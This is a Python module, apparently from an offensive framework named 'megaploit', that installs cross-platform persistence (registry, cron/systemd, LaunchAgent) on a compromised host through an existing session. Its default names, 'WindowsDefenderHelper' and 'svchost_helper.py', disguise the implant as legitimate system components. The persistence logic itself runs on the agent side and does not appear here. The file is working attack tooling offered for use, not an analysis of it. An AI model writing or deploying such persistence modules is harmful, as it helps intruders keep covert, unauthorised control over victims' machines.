"""megaploit.modules.post.multi.manage.persist — cross-platform persistence."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostPersist(AgentModule):
    name        = "post/multi/manage/persist"
    description = "Install cross-platform persistence (Windows registry, Linux cron/systemd, macOS LaunchAgent)"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1547/",
        "https://attack.mitre.org/techniques/T1053/",
        "https://attack.mitre.org/techniques/T1543/001/",
    ]
    platform    = ["windows","linux","macos"]; arch = []; rank = 400

    def _define_options(self) -> None:
        self._opt("SESSION",  OptionType.INTEGER, required=True,
                  description="Session ID to target")
        self._opt("REGNAME",  OptionType.STRING,  default="WindowsDefenderHelper",
                  required=False, description="Windows: registry value name")
        self._opt("FILENAME", OptionType.STRING,  default="svchost_helper.py",
                  required=False, description="Windows: filename in AppData")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        regname  = str(self.get("REGNAME"))
        filename = str(self.get("FILENAME"))
        self._emit("[*] Installing persistence…")
        out = self._send(f"persist {regname} {filename}", sess)
        if "[+]" in out or "success" in out.lower() or "installed" in out.lower():
            self._ok("Persistence installed", output=out,
                     regname=regname, filename=filename)
        elif "error" in out.lower() or "[-]" in out:
            self._fail(f"Persistence failed: {out[:200]}")
        else:
            self._ok("Persistence attempted (manual verification recommended)",
                     output=out)
        return self.results

MODULE = PostPersist
